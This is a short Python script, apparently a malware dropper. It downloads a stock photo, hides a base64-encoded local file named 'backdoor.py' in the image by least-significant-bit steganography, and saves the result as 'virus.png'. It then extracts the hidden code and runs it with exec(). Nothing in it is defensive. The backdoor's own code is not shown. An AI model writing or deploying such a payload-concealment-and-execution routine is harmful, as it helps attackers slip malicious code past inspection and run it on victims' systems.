import io
import os
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import requests
from PIL import Image
from stegano import lsb
import base64

def main():
    def d(path, url, name):
        content = requests.get(url).content
        file = io.BytesIO(content)
        image = Image.open(file)
        file_path = path + name
        with open(file_path, "wb") as f:
            image.save(f, "PNG")  # Save the image as PNG instead of JPEG

    d("", "https://i.natgeofe.com/n/548467d8-c5f1-4551-9f58-6817a8d2c45e/NationalGeographic_2572187_square.jpg", "test.png")  # Save the image as test.png

    with open("backdoor.py", "rb") as f:
        python_script = f.read()

    encoded_script = base64.b64encode(python_script).decode("utf-8")  # Decode the encoded script to a string

    input_image = "test.png"  # Use the PNG image
    output_image = "virus.png"  # Save the output image as PNG

    cover_image = lsb.hide(input_image, encoded_script)
    cover_image.save(output_image)

    print("Python script embedded into the image successfully!")

    os.remove("test.png")  # Remove the test.png image

    encoded_script_2 = lsb.reveal(output_image)  # Reveal the encoded script from the output image
    decoded_script = base64.b64decode(encoded_script_2.encode("utf-8"))  # Encode the revealed script before decoding

    with open("backdoor.py", "wb") as f:
        f.write(decoded_script)

    print("Executing the extracted script...")
    exec(decoded_script)  # Execute the extracted script
    return "war_online_screen"
